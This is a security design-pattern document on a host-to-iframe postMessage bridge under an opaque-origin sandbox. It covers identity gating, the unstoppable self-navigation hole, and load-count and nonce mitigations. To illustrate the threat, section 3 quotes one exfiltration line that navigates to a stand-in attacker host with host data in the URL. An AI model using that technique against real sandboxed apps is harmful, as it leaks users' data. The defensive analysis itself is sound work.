---
id: sandboxed-app-bridge-pattern
name: "Sandboxed App Bridge (host<->iframe postMessage under an opaque-origin sandbox)"
description: "How to let untrusted-authored markup become a full two-way interactive surface — multi-page, host-served data, live theme — without relaxing the network-less sandbox that makes it safe to draw in the first place. The host<->iframe bridge, the identity gate, the self-navigation hole and its detect-and-cut mitigation, and the honest bound on what the bridge may carry."
tags: ["domain:security", "layer:frontend", "topic:lab", "topic:dashboard", "kind:pattern"]
pinned: true
date: "2026-08-26"
updated: "2026-08-26"
---

## Why This Exists

A network-less sandboxed iframe (`sandbox="allow-scripts"`, no `allow-same-origin`, srcdoc CSP `default-src 'none'`) is how this app already draws untrusted-authored markup safely — the Lab's `html/v1` card body and the Chat surface's `dream-html` block both use it. That sandbox proves one thing very well: the document inside cannot reach the network or the parent origin. It says nothing about whether the document can talk to the HOST that embedded it.

The `app/v1` multi-page insight body needed exactly that: a script-authored page asking the host to switch pages, asking the host for data it never had to embed in its own html, reporting its own height so the frame fits it. Building that bridge without widening the sandbox — and finding, the hard way, that "the sandbox makes this safe" is not automatically true once the frame can ask for things — is the reusable shape this pattern names.

## The Pattern

### 1. postMessage works both ways under `allow-scripts` with no `allow-same-origin` — no CSP relaxation needed

The instinct when a sandboxed frame needs to talk to its host is to reach for `allow-same-origin`, or to loosen the CSP's `default-src`. Neither is necessary. `window.postMessage` crosses the sandbox boundary in both directions under `sandbox="allow-scripts"` alone — the grant that blocks fetch/XHR/beacon/remote-image does not touch the messaging channel. So the whole bridge — page-switch requests, data requests, height reports, theme pushes — rides over `postMessage`, and the CSP that makes the frame network-less stays untouched, word for word, from the render that has no bridge at all.

**Data comes from the HOST, never the wire.** The host answers a data request from what it already has in memory (the insight's cache, resolved at sync time) — never by fetching anything on the frame's behalf. This is what keeps the network-less guarantee meaningful even though the frame can now *ask* for things: asking is not fetching, and the host's answer was never on a wire the frame could intercept or redirect.

### 2. The gate is `event.source === contentWindow` — NEVER `event.origin`

A sandboxed frame without `allow-same-origin` has an **opaque origin**, which serializes to the literal string `"null"` in every `MessageEvent.origin`. Gating on `event.origin` is not merely weaker here — it is backwards: it would either reject the host's own frame (whose origin really is `"null"`) or accept messages from every other opaque-origin sandboxed frame on the same page, which is the exact confusion an origin check exists to prevent. The correct and only gate is **identity**: `event.source === iframeRef.current?.contentWindow`. `contentWindow` is a stable reference to that specific frame's `WindowProxy`, and comparing against it answers "did this message come from the frame I embedded" regardless of what that frame's document currently claims its origin is.

Layer a message-shape check and a per-instance token (§4) behind the identity gate, in that order — identity first, because a message that didn't come from the right window shouldn't even be inspected for shape.

### 3. The guarantee that does NOT hold: a sandboxed frame can ALWAYS navigate itself

This is the part that is easy to get wrong, and got gotten wrong once here — a version of this pattern shipped an argument that safety held because "the frame is our own srcdoc," and that claim was withdrawn under review because it is false.

**No sandbox token and no CSP fetch directive prevents self-navigation.** `sandbox="allow-scripts"` without `allow-top-navigation` stops the frame from navigating *other* browsing contexts (its opener, its parent) — it does nothing to stop the frame's own document from replacing itself via `location.href = '…'`, a `<meta refresh>`, or a form submit targeting `_self`. And `default-src 'none'` governs subresource loads (fetch, XHR, image, style, script sources) — a full navigation is not a subresource load, so the CSP that blocks every beacon does not block this. Once the bridge exists at all — once the frame can ask the host for real data it never embedded itself — a self-navigation to `location.href = 'https://evil.example/?d=' + JSON.stringify(await hostData())` is a genuine outbound request the sandbox and the CSP both let through. This was inert before any bridge existed (an `html/v1` body's data was already baked into its own markup, so navigating away with it added nothing an inspecting network log wouldn't already show); a bridge that serves data the markup never had to embed is what makes it live.

Compounding it: `contentWindow` is a stable `WindowProxy` across a navigation — the host doesn't lose its reference when the document inside changes. So a naive bridge that keeps posting to `contentWindow` with `targetOrigin: '*'` (required, since the frame's origin is opaque) would keep delivering every later push into whatever document now occupies the frame, navigation or not.

**The mitigation is DETECT-AND-CUT, never PREVENT.** There is no token or header that stops self-navigation; the only sound response is to notice it happened and stop talking:

- **Primary — load-count teardown.** A bridge-mounted frame instance must be contractually pinned to exactly one document for its lifetime (in practice: keyed by page identity, so a legitimate page switch is always a fresh mount with a fresh key, never an in-place prop change to a live instance). Under that contract, the first `load` event on the iframe element is the srcdoc itself loading — expected, ignorable. **Any second `load` event can only mean the document inside navigated.** On it: stop posting to the frame, stop accepting messages from it, and discard the frame (remount to `about:blank` under a fresh key — don't just hide the old one, since it may still be alive and receiving whatever was already in flight).
- **Secondary — a per-instance nonce.** Mint one token per mounted frame instance (not per message), require every inbound message to carry it and every outbound message to include it, and drop anything with a mismatched or missing one. This closes the race between the moment navigation *starts* and the moment the `load` event *reveals* it: a document that has already navigated away never learned the new page's nonce (there is no new page — it's a different document entirely), so it cannot successfully request anything from the host in that window. It is explicitly **not sufficient on its own** — it cannot stop the host from delivering a push that was already queued before teardown fired — which is why load-count teardown is primary and the nonce is the belt to its braces, not the other way around.

Write this as two mechanisms with a named order, not as one "we handle it" line — a reviewer (or a future maintainer) needs to see that prevention was considered and rejected as impossible, not skipped.

### 4. The honest bound on blast radius — state it as a fact about THIS system, not a general reassurance

Detect-and-cut limits how long a navigated-away document can keep talking; it does not by itself answer "what could it have said before that." The honest answer here is a fact about who authors what, not a property of the bridge:

**The html author IS the script author.** In this system, an `app/v1` page's markup and the script that produces the data it can ask for live in the same file (`lab/scripts/<slug>.mjs`), already documented and accepted as running locally, with credentials, with full filesystem and network access. Anyone who can write the interactive page could, in the same file, already send the same numbers anywhere they liked at sync time — more easily, and without a browser in the loop at all. **The bridge does not widen the trust boundary; it moves data the author already owns across a line that was already crossable.** That is the actual safety argument once detect-and-cut is in place — not "the frame can't misbehave" (it can, briefly, by design of self-navigation being unstoppable), but "misbehaving here tells the author nothing they didn't already know."

**Named revisit condition.** This bound holds only as long as the html author and the data author are the same trust principal. **If page bodies ever become shareable or installable independently of the script that produces their data** — a marketplace of bodies, an imported page from a different insight or a different vault — the bound breaks: a body could then ask the host for data its own author never had, and detect-and-cut alone stops being sufficient. The fix at that point is to restrict what a page may ask for to what it was explicitly given (a per-page allow-list of dataset keys, checked host-side before answering), not to try to harden the navigation mitigation further. Flag this pattern for revision the day that separation is proposed.

### 5. A data-request handle can read anything in its bundle, not only what's currently on screen

`lab.data(key)` — the author-facing call for "give me a dataset" — resolves against the WHOLE bundle the host holds for that insight, not against some narrower scope tied to the page that happens to be showing. A page declares a *default* key so `lab.data()` with no argument is convenient, but nothing stops that page's script from asking for a different key in the same bundle. This is intentional and safe under §4's reasoning (same author, same trust domain, no boundary crossed by reading a sibling dataset instead of your own) — **but do not describe it as "the frame receives only what it is displaying."** That sentence is false and reads as a scoping guarantee that was never built. Say instead: the frame can read any dataset in its own insight's bundle, and nothing outside it (not another insight's cache, not credentials, not the source config) — which is the guarantee that actually holds.

## When To Reach For This

Any time untrusted-or-semi-trusted markup needs to become genuinely interactive against a host application — not just render — while the host wants to keep the strongest available containment (no `allow-same-origin`, no CSP relaxation). The four moves generalize past this one bridge: postMessage-not-fetch as the channel, identity-not-origin as the gate, detect-and-cut-not-prevent for the one guarantee sandboxing cannot give you (self-navigation), and an explicit, named statement of whose data the channel may carry and why that's still safe — checked again the moment the authorship assumption changes.

## Related

- The concrete implementation: `dashboard/src/components/lab/labAppRuntime.ts` (protocol + srcdoc builder), `LabAppFrame.tsx` (the host half — gates, load-count teardown, nonce). Delegates its CSP/sandbox primitives to the shared `dashboard/src/lib/sandboxHtml.ts`, which also backs the Chat surface's `dream-html` block and the Lab's single-page `html/v1` card — none of which carry a bridge, and none of which needed to change for this to ship.
- `skill/references/tasks-and-features.md` § App insights — the authoring contract this pattern secures.
